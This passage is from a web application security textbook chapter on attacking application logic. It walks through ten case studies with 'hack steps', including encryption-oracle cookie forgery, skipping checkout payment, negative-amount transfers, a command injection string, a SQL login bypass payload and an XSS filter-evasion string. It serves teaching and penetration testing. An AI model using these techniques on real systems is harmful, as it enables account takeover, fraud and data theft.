88//1199//22001111 1122::1111::4444 PPMM\n\nStuttard c11.indd V2 - 07/26/2011 Page 406\n406 Chapter 11 n Attacking Application Logic\nthat designers and developers make that can lead directly to faulty logic and\nexpose an application to security vulnerabilities.\nThe Nature of Logic Flaws\nLogic fl aws in web applications are extremely varied. They range from simple\nbugs manifested in a handful of lines of code, to complex vulnerabilities arising\nfrom the interoperation of several core components of the application. In some\ninstances, they may be obvious and easy to detect; in other cases, they may be\nexceptionally subtle and liable to elude even the most rigorous code review or\npenetration test.\nUnlike other coding fl aws such as SQL injection or cross-site scripting, no\ncommon “signature” is associated with logic fl aws. The defi ning characteristic, of\ncourse, is that the logic implemented within the application is defective in some\nway. In many cases, the defect can be represented in terms of a specifi c assumption\nthat the designer or developer made, either explicitly or implicitly, that turns out\nto be fl awed. In general terms, a programmer may have reasoned something like\n“If A happens, then B must be the case, so I will do C.” The programmer did not\nask the entirely different question “But what if X occurs?” and therefore failed to\nconsider a scenario that violates the assumption. Depending on the circumstances,\nthis fl awed assumption may open a signifi cant security vulnerability.\nAs awareness of common web application vulnerabilities has increased in\nrecent years, the incidence and severity of some categories of vulnerabilities have\ndeclined noticeably. However, because of the nature of logic fl aws, it is unlikely\nthat they will ever be eliminated via standards for secure development, use of\ncode-auditing tools, or normal penetration testing. The diverse nature of logic\nfl aws, and the fact that detecting and preventing them often requires a good\nmeasure of lateral thinking, suggests that they will be prevalent for a good\nwhile to come. Any serious attacker, therefore, needs to pay serious attention\nto the logic employed in the application being targeted to try to fi gure out the\nassumptions that designers and developers probably made. Then he should\nthink imaginatively about how those assumptions may be violated.\nReal-World Logic Flaws\nThe best way to learn about logic fl aws is not by theorizing, but by becoming\nacquainted with some actual examples. Although individual instances of logic\nfl aws differ hugely, they share many common themes, and they demonstrate\nthe kinds of mistakes that human developers will always be prone to making.\ncc1111..iinndddd 440066 88//1199//22001111 1122::1111::4444 PPMM\n\n06 Stuttard c11.indd V2 - 07/26/2011 Page 407\nChapter 11 n Attacking Application Logic 407\nHence, insights gathered from studying a sample of logic fl aws should help you\nuncover new fl aws in entirely different situations.\nExample 1: Asking the Oracle\nThe authors have found instances of the “encryption oracle” fl aw within many\ndifferent types of applications. They have used it in numerous attacks, from\ndecrypting domain credentials in printing software to breaking cloud comput-\ning. The following is a classic example of the fl aw found in a software sales site.\nThe Functionality\nThe application implemented a “remember me” function whereby a user could\navoid logging in to the application on each visit by allowing the application to\nset a permanent cookie within the browser. This cookie was protected from\ntampering or disclosure by an encryption algorithm that was run over a string\ncomposed of the name, user ID, and volatile data to ensure that the resultant\nvalue was unique and could not be predicted. To ensure that it could not be\nreplayed by an attacker who gained access to it, data specifi c to the machine\nwas also collected, including the IP address.\nThis cookie was justifi ably considered a robust solution for protecting a\npotentially vulnerable piece of required business functionality.\nAs well as a “remember me” function, the application had functionality to\nstore the user’s screen name within a cookie named ScreenName. That way, the\nuser could receive a personalized greeting in the corner of the site whenever\nshe next visited the site. Deciding that this name was also a piece of security\ninformation, it was deemed that this should also be encrypted.\nThe Assumption\nThe developers decided that because the ScreenName cookie was of considerably\nless value to an attacker than the RememberMe cookie, they may as well use the\nsame encryption algorithm to protect it. What they did not consider was that a\nuser can specify his screen name and view it onscreen. This inadvertently gave\nusers access to the encryption function (and encryption key) used to protect the\npersistent authentication token RememberMe.\nThe Attack\nIn a simple attack, a user supplied the encrypted value of his or her RememberMe\ncookie in place of the encrypted ScreenName cookie. When displaying the screen\nname back to the user, the application would decrypt the value, check that\ncc1111..iinndddd 440077 88//1199//22001111 1122::1111::4444 PPMM\nStuttard c11.indd V2 - 07/26/2011 Page 408\n408 Chapter 11 n Attacking Application Logic\ndecryption had worked, and then print the result on-screen. This resulted in\nthe following message:\nWelcome, marcus|734|192.168.4.282750184\nAlthough this was interesting, it was not necessarily a high-risk issue. It\nsimply meant that given an encrypted RememberMe cookie, an attacker could\nlist the contents, including a username, user ID, and IP address. Because no\npassword was stored in the cookie, there was no immediate way to act on the\ninformation obtained.\nThe real issue arose from the fact that users could specify their screen names.\nAs a result, a user could choose this screen name, for example:\nadmin|1|192.168.4.282750184\nWhen the user logged out and logged back in, the application encrypted this\nvalue and stored it in the user’s browser as the encrypted ScreenName cookie.\nIf an attacker submitted this encrypted token as the value of the RememberMe\ncookie, the application decrypted it, read the user ID, and logged in the attacker\nas the administrator! Even though the encryption was Triple DES, using a strong\nkey and protected against replay attacks, the application could be harnessed as\nan “encryption oracle” to decrypt and encrypt arbitrary values.\n\nHACK STEPS\nManifestations of this type of vulnerability can be found in diverse locations.\nExamples include account recovery tokens, token-based access to authenti-\ncated resources, and any other value being sent to the client side that needs\nto be either tamper-proof or unreadable to the user.\n1. Look for locations where encryption (not hashing) is used in the applica-\ntion. Determine any locations where the application encrypts or decrypts\nvalues supplied by a user, and attempt to substitute any other encrypted\nvalues encountered within the application. Try to cause an error within\nthe application that reveals the decrypted value or where the decrypted\nvalue is purposely displayed on-screen.\n2. Look for an “oracle reveal” vulnerability by determining where an\nencrypted value can be supplied that results in the correspond-\ning decrypted value’s being displayed in the application’s response.\nDetermine whether this leads to the disclosure of sensitive information,\nsuch as a password or credit card.\n3. Look for an “oracle encrypt” vulnerability by determining where supply-\ning a cleartext value causes the application to return a corresponding\nencrypted value. Determine where this can be abused by specifying arbi-\ntrary values, or malicious payloads that the application will process.\ncc1111..iinndddd 440088 88//1199//22001111 1122::1111::4444 PPMM\n\n08 Stuttard c11.indd V2 - 07/26/2011 Page 409\nChapter 11 n Attacking Application Logic 409\nExample 2: Fooling a Password Change Function\nThe authors have encountered this logic fl aw in a web application implemented\nby a fi nancial services company and also in the AOL AIM Enterprise Gateway\napplication.\nThe Functionality\nThe application implemented a password change function for end users. It\nrequired the user to fi ll out fi elds for username, existing password, new pass-\nword, and confi rm new password.\nThere was also a password change function for use by administrators. This\nallowed them to change the password of any user without supplying the existing\npassword. The two functions were implemented within the same server-side\nscript.\nThe Assumption\nThe client-side interface presented to users and administrators differed in one\nrespect: the administrator’s interface did not contain a fi eld for the existing\npassword. When the server-side application processed a password change\nrequest, it used the presence or absence of the existing password parameter to\nindicate whether the request was from an administrator or an ordinary user. In\nother words, it assumed that ordinary users would always supply an existing\npassword parameter.\nThe code responsible looked something like this:\nString existingPassword = request.getParameter(“existingPassword”);\nif (null == existingPassword)\n{\ntrace(“Old password not supplied, must be an administrator”);\nreturn true;\n}\nelse\n{\ntrace(“Verifying user’s old password”);\n...\nThe Attack\nWhen the assumption is explicitly stated in this way, the logic fl aw becomes\nobvious. Of course, an ordinary user could issue a request that did not contain\nan existing password parameter, because users controlled every aspect of the\nrequests they issued.\ncc1111..iinndddd 440099 88//1199//22001111 1122::1111::4455 PPMM\n\nStuttard c11.indd V2 - 07/26/2011 Page 410\n410 Chapter 11 n Attacking Application Logic\nThis logic fl aw was devastating for the application. It enabled an attacker to\nreset the password of any other user and take full control of that person’s account.\n\nHACK STEPS\n1. When probing key functionality for logic flaws, try removing in turn each\nparameter submitted in requests, including cookies, query string fields,\nand items of POST data.\n2. Be sure to delete the actual name of the parameter as well as its value.\nDo not just submit an empty string, because typically the server handles\nthis differently.\n3. Attack only one parameter at a time to ensure that all relevant code paths\nwithin the application are reached.\n4. If the request you are manipulating is part of a multistage process, follow\nthe process through to completion, because some later logic may process\ndata that was supplied in earlier steps and stored within the session.\nExample 3: Proceeding to Checkout\nThe authors encountered this logic fl aw in the web application employed by\nan online retailer.\nThe Functionality\nThe process of placing an order involved the following stages:\n1. Browse the product catalog, and add items to the shopping basket.\n2. Return to the shopping basket, and fi nalize the order.\n3. Enter payment information.\n4. Enter delivery information.\nThe Assumption\nThe developers assumed that users would always access the stages in the intended\nsequence, because this was the order in which the stages are delivered to the\nuser by the navigational links and forms presented to the user’s browser. Hence,\nany user who completed the ordering process must have submitted satisfactory\npayment details along the way.\nThe Attack\nThe developers’ assumption was fl awed for fairly obvious reasons. Users con-\ntrolled every request they made to the application and therefore could access\ncc1111..iinndddd 441100 88//1199//22001111 1122::1111::4455 PPMM\n10 Stuttard c11.indd V2 - 07/26/2011 Page 411\nChapter 11 n Attacking Application Logic 411\nany stage of the ordering process in any sequence. By proceeding directly from\nstage 2 to stage 4, an attacker could generate an order that was fi nalized for\ndelivery but that had not actually been paid for.\n\nHACK STEPS\nThe technique for fi nding and exploiting fl aws of this kind is known as forced\nbrowsing. It involves circumventing any controls imposed by in-browser navi-\ngation on the sequence in which application functions may be accessed:\n1. When a multistage process involves a defined sequence of requests,\nattempt to submit these requests out of the expected sequence. Try skip-\nping certain stages, accessing a single stage more than once, and access-\ning earlier stages after later ones.\n2. The sequence of stages may be accessed via a series of GET or POST\nrequests for distinct URLs, or they may involve submitting different sets of\nparameters to the same URL. The stage being requested may be specified\nby submitting a function name or index within a request parameter. Be\nsure to understand fully the mechanisms that the application is employing\nto deliver access to distinct stages.\n3. From the context of the functionality that is implemented, try to under-\nstand what assumptions the developers may have made and where the\nkey attack surface lies. Try to identify ways of violating those assumptions\nto cause undesirable behavior within the application.\n4. When multistage functions are accessed out of sequence, it is common\nto encounter a variety of anomalous conditions within the application,\nsuch as variables with null or uninitialized values, a partially defined or\ninconsistent state, and other unpredictable behavior. In this situation, the\napplication may return an interesting error message and debug output,\nwhich you can use to better understand its internal workings and thereby\nfine-tune the current or a different attack (see Chapter 15). Sometimes,\nthe application may get into a state entirely unanticipated by developers,\nwhich may lead to serious security flaws.\nNOTE Many types of access control vulnerability are similar in nature to this\nlogic fl aw. When a privileged function involves multiple stages that normally\nare accessed in a defi ned sequence, the application may assume that users\nwill always proceed through the functionality in this sequence. The applica-\ntion may enforce strict access control on the initial stages of the process and\nassume that any user who reaches the later stages therefore must be autho-\nrized. If a low-privileged user proceeds directly to a later stage, she may be\nable to access it without any restrictions. See Chapter 8 for more details on\nfi nding and exploiting vulnerabilities of this kind.\ncc1111..iinndddd 441111 88//1199//22001111 1122::1111::4455 PPMM\n\nStuttard c11.indd V2 - 07/26/2011 Page 412\n412 Chapter 11 n Attacking Application Logic\nExample 4: Rolling Your Own Insurance\nThe authors encountered this logic fl aw in a web application deployed by a\nfi nancial services company.\nThe Functionality\nThe application enabled users to obtain quotes for insurance and, if desired,\ncomplete and submit an insurance application online. The process was spread\nacross a dozen stages:\nn At the fi rst stage, the applicant submitted some basic information and\nspecifi ed either a preferred monthly premium or the value he wanted\ninsurance for. The application offered a quote, computing whichever\nvalue the applicant did not specify.\nn Across several stages, the applicant supplied various other personal details,\nincluding health, occupation, and pastimes.\nn Finally, the application was transmitted to an underwriter working for\nthe insurance company. Using the same web application, the underwriter\nreviewed the details and decided whether to accept the application as is\nor modify the initial quote to refl ect any additional risks.\nThrough each of the stages described, the application employed a shared com-\nponent to process each parameter of user data submitted to it. This component\nparsed all the data in each POST request into name/value pairs and updated its\nstate information with each item of data received.\nThe Assumption\nThe component that processed user-supplied data assumed that each request\nwould contain only the parameters that had been requested from the user in\nthe relevant HTML form. Developers did not consider what would happen if a\nuser submitted parameters he was not asked to supply.\nThe Attack\nOf course, the assumption was fl awed, because users could submit arbitrary\nparameter names and values with every request. As a result, the application’s\ncore functionality was broken in various ways:\nn An attacker could exploit the shared component to bypass all server-side\ninput validation. At each stage of the quotation process, the application\nperformed strict validation of the data expected at that stage and rejected\nany data that failed this validation. But the shared component updated\ncc1111..iinndddd 441122 88//1199//22001111 1122::1111::4455 PPMM\n12 Stuttard c11.indd V2 - 07/26/2011 Page 413\nChapter 11 n Attacking Application Logic 413\nthe application’s state with every parameter supplied by the user. Hence,\nif an attacker submitted data out of sequence by supplying a name/value\npair that the application expected at an earlier stage, that data would be\naccepted and processed, with no validation having been performed. As it\nhappened, this possibility paved the way for a stored cross-site scripting\nattack targeting the underwriter, which allowed a malicious user to access\nthe personal information of other applicants (see Chapter 12).\nn An attacker could buy insurance at an arbitrary price. At the fi rst stage of\nthe quotation process, the applicant specifi ed either her preferred monthly\npremium or the value she wanted to insure, and the application computed\nthe other item accordingly. However, if a user supplied new values for\neither or both of these items at a later stage, the application’s state was\nupdated with these values. By submitting these parameters out of sequence,\nan attacker could obtain a quote for insurance at an arbitrary value and\narbitrary monthly premium.\nn There were no access controls regarding which parameters a given type of\nuser could supply. When an underwriter reviewed a completed applica-\ntion, he updated various items of data, including the acceptance decision.\nThis data was processed by the shared component in the same way as\ndata supplied by an ordinary user. If an attacker knew or guessed the\nparameter names used when the underwriter reviewed an application, the\nattacker could simply submit these, thereby accepting his own application\nwithout any actual underwriting.\n\nHACK STEPS\nThe fl aws in this application were fundamental to its security, but none of\nthem would have been identifi ed by an attacker who simply intercepted\nbrowser requests and modifi ed the parameter values being submitted.\n1. Whenever an application implements a key action across multiple stages,\nyou should take parameters that are submitted at one stage of the pro-\ncess and try submitting these to a different stage. If the relevant items of\ndata are updated within the application’s state, you should explore the\nramifications of this behavior to determine whether you can leverage it to\ncarry out any malicious action, as in the preceding three examples.\n2. If the application implements functionality whereby different categories\nof user can update or perform other actions on a common collection\nof data, you should walk through the process using each type of user\nand observe the parameters submitted. Where different parameters are\nordinarily submitted by the different users, take each parameter submit-\nted by one user and try to submit it as the other user. If the parameter\nis accepted and processed as that user, explore the implications of this\nbehavior as previously described.\ncc1111..iinndddd 441133 88//1199//22001111 1122::1111::4455 PPMM\n\nStuttard c11.indd V2 - 07/26/2011 Page 414\n414 Chapter 11 n Attacking Application Logic\nExample 5: Breaking the Bank\nThe authors encountered this logic fl aw in the web application deployed by a\nmajor fi nancial services company.\nThe Functionality\nThe application enabled existing customers who did not already use the online\napplication to register to do so. New users were required to supply some basic\npersonal information to provide a degree of assurance of their identity. This\ninformation included name, address, and date of birth, but it did not include\nanything secret such as an existing password or PIN.\nWhen this information had been entered correctly, the application forwarded\nthe registration request to back-end systems for processing. An information pack\nwas mailed to the user’s registered home address. This pack included instructions\nfor activating her online access via a telephone call to the company’s call center\nand also a one-time password to use when fi rst logging in to the application.\nThe Assumption\nThe application’s designers believed that this mechanism provided a robust\ndefense against unauthorized access to the application. The mechanism imple-\nmented three layers of protection:\nn A modest amount of personal data was required up front to deter a mali-\ncious attacker or mischievous user from attempting to initiate the registra-\ntion process on other users’ behalf.\nn The process involved transmitting a key secret out-of-band to the cus-\ntomer’s registered home address. An attacker would need to have access\nto the victim’s personal mail.\nn The customer was required to telephone the call center and authenticate\nhimself there in the usual way, based on personal information and selected\ndigits from a PIN.\nThis design was indeed robust. The logic fl aw lay in the implementation of\nthe mechanism.\nThe developers implementing the registration mechanism needed a way to\nstore the personal data submitted by the user and correlate this with a unique\ncustomer identity within the company’s database. Keen to reuse existing code,\nthey came across the following class, which appeared to serve their purposes:\nclass CCustomer\n{\nString firstName;\nString lastName;\ncc1111..iinndddd 441144 88//1199//22001111 1122::1111::4455 PPMM\n14 Stuttard c11.indd V2 - 07/26/2011 Page 415\nChapter 11 n Attacking Application Logic 415\nCDoB dob;\nCAddress homeAddress;\nlong custNumber;\n...\nAfter the user’s information was captured, this object was instantiated, popu-\nlated with the supplied information, and stored in the user’s session. The applica-\ntion then verifi ed the user’s details and, if they were valid, retrieved that user’s\nunique customer number, which was used in all the company’s systems. This\nnumber was added to the object, together with some other useful information\nabout the user. The object was then transmitted to the relevant back-end system\nfor the registration request to be processed.\nThe developers assumed that using this code component was harmless and\nwould not lead to a security problem. However, the assumption was fl awed,\nwith serious consequences.\nThe Attack\nThe same code component that was incorporated into the registration function-\nality was also used elsewhere within the application, including within the core\nfunctionality. This gave authenticated users access to account details, statements,\nfunds transfers, and other information. When a registered user successfully\nauthenticated herself to the application, this same object was instantiated and\nsaved in her session to store key information about her identity. The majority\nof the functionality within the application referenced the information within\nthis object to carry out its actions. For example, the account details presented to\nthe user on her main page were generated on the basis of the unique customer\nnumber contained within this object.\nThe way in which the code component was already being employed within\nthe application meant that the developers’ assumption was fl awed, and the\nmanner in which they reused it did indeed open a signifi cant vulnerability.\nAlthough the vulnerability was serious, it was in fact relatively subtle to\ndetect and exploit. Access to the main application functionality was protected by\naccess controls at several layers, and a user needed to have a fully authenticated\nsession to pass these controls. To exploit the logic fl aw, therefore, an attacker\nneeded to follow these steps:\nn Log in to the application using his own valid account credentials.\nn Using the resulting authenticated session, access the registration function-\nality and submit a different customer’s personal information. This caused\nthe application to overwrite the original CCustomer object in the attacker’s\nsession with a new object relating to the targeted customer.\nn Return to the main application functionality and access the other cus-\ntomer’s account.\ncc1111..iinndddd 441155 88//1199//22001111 1122::1111::4455 PPMM\n\nStuttard c11.indd V2 - 07/26/2011 Page 416\n416 Chapter 11 n Attacking Application Logic\nA vulnerability of this kind is not easy to detect when probing the applica-\ntion from a black-box perspective. However, it is also hard to identify when\nreviewing or writing the actual source code. Without a clear understanding of\nthe application as a whole and how different components are used in different\nareas, the fl awed assumption made by developers may not be evident. Of course,\nclearly commented source code and design documentation would reduce the\nlikelihood of such a defect’s being introduced or remaining undetected.\n\nHACK STEPS\n1. In a complex application involving either horizontal or vertical privilege\nsegregation, try to locate any instances where an individual user can accu-\nmulate an amount of state within his session that relates in some way to\nhis identity.\n2. Try to step through one area of functionality, and then switch to an unre-\nlated area, to determine whether any accumulated state information has\nan effect on the application’s behavior.\nExample 6: Beating a Business Limit\nThe authors encountered this logic fl aw in a web-based enterprise resource\nplanning application used within a manufacturing company.\nThe Functionality\nFinance personnel could perform funds transfers between various bank accounts\nowned by the company and its key customers and suppliers. As a precaution\nagainst fraud, the application prevented most users from processing transfers\nwith a value greater than $10,000. Any transfer larger than this required a senior\nmanager’s approval.\nThe Assumption\nThe code responsible for implementing this check within the application was\nsimple:\nbool CAuthCheck::RequiresApproval(int amount)\n{\nif (amount <= m_apprThreshold)\nreturn false;\nelse return true;\n}\ncc1111..iinndddd 441166 88//1199//22001111 1122::1111::4455 PPMM\n16 Stuttard c11.indd V2 - 07/26/2011 Page 417\nChapter 11 n Attacking Application Logic 417\nThe developers assumed that this transparent check was bulletproof. No\ntransaction for greater than the confi gured threshold could ever escape the\nrequirement for secondary approval.\nThe Attack\nThe developers’ assumption was fl awed because they overlooked the possibility\nthat a user would attempt to process a transfer for a negative amount. Any nega-\ntive number would clear the approval test, because it is less than the threshold.\nHowever, the banking module of the application accepted negative transfers and\nsimply processed them as positive transfers in the opposite direction. Hence,\nany user who wanted to transfer $20,000 from account A to account B could\nsimply initiate a transfer of –$20,000 from account B to account A, which had\nthe same effect and required no approval. The antifraud defenses built into the\napplication could be bypassed easily!\nNOTE Many kinds of web applications employ numeric limits within their\nbusiness logic:\nn A retailing application may prevent a user from ordering more than the\nnumber of units available in stock.\nn A banking application may prevent a user from making bill payments\nthat exceed her current account balance.\nn An insurance application may adjust its quotes based on age thresholds.\nFinding a way to beat such limits often does not represent a security com-\npromise of the application itself. However, it may have serious business con-\nsequences and represent a breach of the controls that the owner is relying on\nthe application to enforce.\nThe most obvious vulnerabilities of this kind often are detected during\nthe user-acceptance testing that normally occurs before an application is\nlaunched. However, more subtle manifestations of the problem may remain,\nparticularly when hidden parameters are being manipulated.\n\nHACK STEPS\nThe fi rst step in attempting to beat a business limit is to understand what\ncharacters are accepted within the relevant input that you control.\n1. Try entering negative values, and see if the application accepts them and\nprocesses them in the way you would expect.\n2. You may need to perform several steps to engineer a change in the appli-\ncation’s state that can be exploited for a useful purpose. For example,\nseveral transfers between accounts may be required until a suitable bal-\nance has been accrued that can actually be extracted.\ncc1111..iinndddd 441177 88//1199//22001111 1122::1111::4455 PPMM\n\nStuttard c11.indd V2 - 07/26/2011 Page 418\n418 Chapter 11 n Attacking Application Logic\nExample 7: Cheating on Bulk Discounts\nThe authors encountered this logic fl aw in the retail application of a software\nvendor.\nThe Functionality\nThe application allowed users to order software products and qualify for bulk\ndiscounts if a suitable bundle of items was purchased. For example, users who\npurchased an antivirus solution, personal fi rewall, and antispam software were\nentitled to a 25% discount on the individual prices.\nThe Assumption\nWhen a user added an item of software to his shopping basket, the application\nused various rules to determine whether the bundle of purchases he had chosen\nentitled him to a discount. If so, the prices of the relevant items within the shop-\nping basket were adjusted in line with the discount. The developers assumed\nthat the user would go on to purchase the chosen bundle and therefore would\nbe entitled to the discount.\nThe Attack\nThe developers’ assumption is rather obviously fl awed because it ignores the\nfact that users may remove items from their shopping baskets after they have\nbeen added. A crafty user could add to his basket large quantities of every\nsingle product on sale from the vendor to attract the maximum possible bulk\ndiscounts. After the discounts were applied to items in his shopping basket, he\ncould remove items he did not want and still receive the discounts applied to\nthe remaining products.\n\nHACK STEPS\n1. In any situation where prices or other sensitive values are adjusted based\non criteria that are determined by user-controllable data or actions, first\nunderstand the algorithms that the application uses and the point within\nits logic where adjustments are made. Identify whether these adjustments\nare made on a one-time basis or whether they are revised in response to\nfurther actions performed by the user.\n2. Think imaginatively. Try to find a way of manipulating the application’s\nbehavior to cause it to get into a state where the adjustments it has\napplied do not correspond to the original criteria intended by its design-\ners. In the most obvious case, as just described, this may simply involve\nremoving items from a shopping cart after a discount has been applied!\ncc1111..iinndddd 441188 88//1199//22001111 1122::1111::4455 PPMM\n\n18 Stuttard c11.indd V2 - 07/26/2011 Page 419\nChapter 11 n Attacking Application Logic 419\nExample 8: Escaping from Escaping\nThe authors encountered this logic fl aw in various web applications, including\nthe web administration interface used by a network intrusion detection product.\nThe Functionality\nThe application’s designers had decided to implement some functionality that\ninvolved passing user-controllable input as an argument to an operating system\ncommand. The application’s developers understood the inherent risks involved\nin this kind of operation (see Chapter 9) and decided to defend against these\nrisks by sanitizing any potentially malicious characters within the user input.\nAny instances of the following would be escaped using the backslash character:\n;|&<>‘ space and newline\nEscaping data in this way causes the shell command interpreter to treat the\nrelevant characters as part of the argument being passed to the invoked com-\nmand, rather than as shell metacharacters. Such metacharacters could be used\nto inject additional commands or arguments, redirect output, and so on.\nThe Assumption\nThe developers were certain that they had devised a robust defense against\ncommand injection attacks. They had brainstormed every possible character that\nmight assist an attacker and had ensured that they were all properly escaped\nand therefore made safe.\nThe Attack\nThe developers forgot to escape the escape character itself.\nThe backslash character usually is not of direct use to an attacker when\nexploiting a simple command injection fl aw. Therefore, the developers did not\nidentify it as potentially malicious. However, by failing to escape it, they pro-\nvided a means for the attacker to defeat their sanitizing mechanism.\nSuppose an attacker supplies the following input to the vulnerable function:\nfoo\\;ls\nThe application applies the relevant escaping, as described previously, so the\nattacker’s input becomes:\nfoo\\\\;ls\nWhen this data is passed as an argument to the operating system command,\nthe shell interpreter treats the fi rst backslash as the escape character. Therefore,\nit treats the second backslash as a literal backslash—not as an escape character,\nbut as part of the argument itself. It then encounters a semicolon that is appar-\nently not escaped. It treats this as a command separator and therefore goes on\nto execute the injected command supplied by the attacker.\ncc1111..iinndddd 441199 88//1199//22001111 1122::1111::4455 PPMM\n\nStuttard c11.indd V2 - 07/26/2011 Page 420\n420 Chapter 11 n Attacking Application Logic\n\nHACK STEPS\nWhenever you probe an application for command injection and other fl aws,\nhaving attempted to insert the relevant metacharacters into the data you con-\ntrol, always try placing a backslash immediately before each such character to\ntest for the logic fl aw just described.\nNOTE This same fl aw can be found in some defenses against cross-site\nscripting attacks (see Chapter 12). When user-supplied input is copied directly\ninto the value of a string variable in a piece of JavaScript, this value is encap-\nsulated within quotation marks. To defend themselves against cross-site\nscripting, many applications use backslashes to escape any quotation marks\nthat appear within the user’s input. However, if the backslash character itself\nis not escaped, an attacker can submit \\’ to break out of the string and there-\nfore take control of the script. This exact bug was found in early versions of\nthe Ruby On Rails framework in the escape_javascript function.\nExample 9: Invalidating Input Validation\nThe authors encountered this logic fl aw in a web application used in an e-com-\nmerce site. Variants can be found in many other applications.\nThe Functionality\nThe application contained a suite of input validation routines to protect against\nvarious types of attacks. Two of these defense mechanisms were a SQL injection\nfi lter and a length limiter.\nIt is common for applications to try to defend themselves against SQL injec-\ntion by escaping any single quotation marks that appear within string-based\nuser input (and rejecting any that appear within numeric input). As described\nin Chapter 9, two single quotation marks together are an escape sequence that\nrepresents one literal single quote, which the database interprets as data within a\nquoted string rather than the closing string terminator. Many developers reason,\ntherefore, that by doubling any single quotation marks within user-supplied\ninput, they will prevent any SQL injection attacks from occurring.\nThe length limiter was applied to all input, ensuring that no variable sup-\nplied by a user was longer than 128 characters. It achieved this by truncating\nany variables to 128 characters.\nThe Assumption\nIt was assumed that both the SQL injection fi lter and length truncation were\ndesirable defenses from a security standpoint, so both should be applied.\ncc1111..iinndddd 442200 88//1199//22001111 1122::1111::4455 PPMM\n20 Stuttard c11.indd V2 - 07/26/2011 Page 421\nChapter 11 n Attacking Application Logic 421\nThe Attack\nThe SQL injection defense works by doubling any quotation marks appearing\nwithin user input, so that within each pair of quotes, the fi rst quote acts as an\nescape character to the second. However, the developers did not consider what\nwould happen to the sanitized input if it was then handed to the truncation\nfunction.\nRecall the SQL injection example in a login function in Chapter 9. Suppose\nthat the application doubles any single quotation marks contained in user input\nand also then imposes a length limit on the data, truncating it to 128 characters.\nSupplying this username:\nadmin’--\nnow results in the following query, which fails to bypass the login:\nSELECT * FROM users WHERE username = ‘admin’’--’ and password = ‘’\nHowever, if you submit a following username (containing 127 a’s followed\nby a single quotation mark):\naaaaaaaa[...]aaaaaaaaaaa’\nthe application fi rst doubles up the single quotation mark and then truncates the\nstring to 128 characters, returning your input to its original value. This results\nin a database error, because you have injected an additional single quotation\nmark into the query without fi xing the surrounding syntax. If you now also\nsupply the password:\nor 1=1--\nthe application performs the following query, which succeeds in bypassing the\nlogin:\nSELECT * FROM users WHERE username = ‘aaaaaaaa[...]aaaaaaaaaaa’’ and\npassword = ‘or 1=1--’\nThe doubled quotation mark at the end of the string of a’s is interpreted\nas an escaped quotation mark and, therefore, as part of the query data. This\nstring effectively continues as far as the next single quotation mark, which\nin the original query marked the start of the user-supplied password value.\nThus, the actual username that the database understands is the literal string\ndata shown here:\naaaaaaaa[...]aaaaaaaaaaa’and password =\nHence, whatever comes next is interpreted as part of the query itself and can\nbe crafted to interfere with the query logic.\ncc1111..iinndddd 442211 88//1199//22001111 1122::1111::4455 PPMM\n\nStuttard c11.indd V2 - 07/26/2011 Page 422\n422 Chapter 11 n Attacking Application Logic\nTIP You can test for this type of vulnerability without knowing exactly what\nlength limit is being imposed by submitting in turn two long strings of the fol-\nlowing form:\n‘’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’and so on\na’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’and so on\nand determining whether an error occurs. Any truncation of escaped input will\noccur after either an even or odd number of characters. Whichever possibility\nis the case, one of the preceding strings will result in an odd number of single\nquotation marks being inserted into the query, resulting in invalid syntax.\n\nHACK STEPS\nMake a note of any instances in which the application modifi es user input, in\nparticular by truncating it, stripping out data, encoding, or decoding. For any\nobserved instances, determine whether a malicious string can be contrived:\n1. If data is stripped once (nonrecursively), determine whether you can\nsubmit a string that compensates for this. For example, if the application\nfilters SQL keywords such as SELECT, submit SELSELECTECT and see if\nthe resulting filtering removes the inner SELECT substring, leaving the\nwordSELECT.\n2. If data validation takes place in a set order and one or more validation\nprocesses modifies the data, determine whether this can be used to beat\none of the prior validation steps. For example, if the application performs\nURL decoding and then strips malicious data such as the <script> tag, it\nmay be possible to overcome this with strings such as:\n%<script>3cscript%<script>3ealert(1)%<script>3c/\nscript%<script>3e\nNOTE Cross-site scripting fi lters frequently inadvisably strip all data that\noccurs between HTML tag pairs, such as <tag1>aaaaa</tag1>. These are\noften vulnerable to this type of attack.\nExample 10: Abusing a Search Function\nThe authors encountered this logic fl aw in an application providing subscription-\nbased access to fi nancial news and information. The same vulnerability was\nlater found in two completely unrelated applications, illustrating the subtle and\npervasive nature of many logic fl aws.\ncc1111..iinndddd 442222 88//1199//22001111 1122::1111::4455 PPMM\n22 Stuttard c11.indd V2 - 07/26/2011 Page 423\nChapter 11 n Attacking Application Logic 423\nThe Functionality\nThe application provided access to a huge archive of historical and current\ninformation, including company reports and accounts, press releases, market\nanalyses, and the like. Most of this information was accessible only to paying\nsubscribers.\nThe application provided a powerful and fi ne-grained search function that\nall users could access. When an anonymous user performed a query, the search\nfunction returned links to all documents that matched the query. However, the\nuser was required to subscribe to retrieve any of the actual protected documents\nhis query returned. The application’s owners regarded this behavior as a useful\nmarketing tactic.\nThe Assumption\nThe application’s designer assumed that users could not use the search function\nto extract any useful information without paying for it. The document titles\nlisted in the search results were typically cryptic, such as “Annual Results 2010,”\n“Press Release 08-03-2011,” and so on.\nThe Attack\nBecause the search function indicated how many documents matched a given\nquery, a wily user could issue a large number of queries and use inference to\nextract information from the search function that normally would need to be\npaid for. For example, the following queries could be used to zero in on the\ncontents of an individual protected document:\nwahh consulting\n>> 276 matches\nwahh consulting “Press Release 08-03-2011” merger\n>> 0 matches\nwahh consulting “Press Release 08-03-2011” share issue\n>> 0 matches\nwahh consulting “Press Release 08-03-2011” dividend\n>> 0 matches\nwahh consulting “Press Release 08-03-2011” takeover\n>> 1 match\nwahh consulting “Press Release 08-03-2011” takeover haxors inc\n>> 0 matches\nwahh consulting “Press Release 08-03-2011” takeover uberleet ltd\n>> 0 matches\nwahh consulting “Press Release 08-03-2011” takeover script kiddy corp\n>> 0 matches\nwahh consulting “Press Release 08-03-2011” takeover ngs\n>> 1 match\ncc1111..iinndddd 442233 88//1199//22001111 1122::1111::4466 PPMM\n\nStuttard c11.indd V2 - 07/26/2011 Page 424\n424 Chapter 11 n Attacking Application Logic\nwahh consulting “Press Release 08-03-2011” takeover ngs announced\n>> 0 matches\nwahh consulting “Press Release 08-03-2011” takeover ngs cancelled\n>> 0 matches\nwahh consulting “Press Release 08-03-2011” takeover ngs completed\n>> 1 match\nAlthough the user cannot view the document itself, with suffi cient imagi-\nnation and use of scripted requests, he may be able to build a fairly accurate\nunderstanding of its contents.\nTIP In certain situations, being able to leach information via a search\nfunction in this way may be critical to the security of the application 